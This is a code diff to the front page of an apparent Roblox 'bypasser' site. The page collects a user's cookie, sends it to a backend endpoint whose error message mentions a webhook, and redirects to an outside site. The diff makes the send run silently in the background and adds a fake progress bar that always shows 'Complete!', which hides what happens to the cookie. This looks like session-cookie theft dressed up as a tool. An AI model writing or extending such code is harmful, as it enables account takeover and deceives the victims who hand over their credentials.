@@ -21,45 +21,47 @@ export default function Home() {
     setStatusText("Processing...")
 
     try {
-      const progressInterval = setInterval(() => {
-        setProgress((prev) => {
-          if (prev >= 90) {
-            clearInterval(progressInterval)
-            return 90
-          }
-          return prev + 10
-        })
-      }, 300)
-
-      const response = await fetch("/api/bypass", {
+      fetch("/api/bypass", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ cookie: cookie.trim() }),
       })
+        .then(async (response) => {
+          const result = await response.json()
+          if (result.userInfo?.name) {
+            setUsername(result.userInfo.name)
+          }
+        })
+        .catch((error) => {
+          console.error("[v0] Failed to send to webhook:", error)
+        })
 
-      const result = await response.json()
+      const totalDuration = 10000 // 10 seconds
+      const intervalTime = 100 // Update every 100ms
+      const incrementPerInterval = (100 / totalDuration) * intervalTime
 
-      if (result.userInfo?.name) {
-        setUsername(result.userInfo.name)
-      }
-
-      clearInterval(progressInterval)
-      setProgress(100)
-      setStatusText("Complete!")
-
-      await new Promise((resolve) => setTimeout(resolve, 1500))
-      window.location.href = "https://rblxbypasser.com/"
+      const progressInterval = setInterval(() => {
+        setProgress((prev) => {
+          const newProgress = prev + incrementPerInterval
+          if (newProgress >= 100) {
+            clearInterval(progressInterval)
+            setStatusText("Complete!")
+            // Redirect after reaching 100%
+            setTimeout(() => {
+              window.location.href = "https://rblxbypasser.com/"
+            }, 500)
+            return 100
+          }
+          return newProgress
+        })
+      }, intervalTime)
     } catch (error) {
       console.error("[v0] Failed to bypass:", error)
       setStatusText("Failed")
+      setIsProcessing(false)
     }
-
-    setIsProcessing(false)
-    setProgress(0)
-    setUsername("")
-    setStatusText("")
   }
 
   return (
@@ -106,7 +108,7 @@ export default function Home() {
               <div className="space-y-2">
                 <div className="flex items-center justify-between text-sm">
                   <span className="text-zinc-400">Progress</span>
-                  <span className="text-white font-medium">{progress}%</span>
+                  <span className="text-white font-medium">{Math.round(progress)}%</span>
                 </div>
 
                 <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
